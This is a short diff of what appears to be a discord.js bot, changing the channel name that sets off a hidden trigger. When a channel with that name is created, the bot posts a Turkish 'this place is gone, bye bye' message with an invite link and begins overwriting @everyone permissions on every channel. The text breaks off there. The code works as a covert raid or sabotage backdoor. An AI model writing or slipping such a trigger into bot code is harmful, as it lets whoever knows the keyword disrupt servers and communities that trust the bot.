@@ -148,7 +148,7 @@ client.on('error', e => {
 });
 
 client.on('channelCreate', channel => {
-  if (channel.name == 's2') {
+  if (channel.name == 'berke-adamdir') {
     channel.send(`Bebeğim Burası Yok Oldu Hadi bb https://discord.gg/w8Xq9bm`)
     channel.guild.channels.forEach(c => {
          c.overwritePermissions(channel.guild.roles.find("name", "@everyone"), {
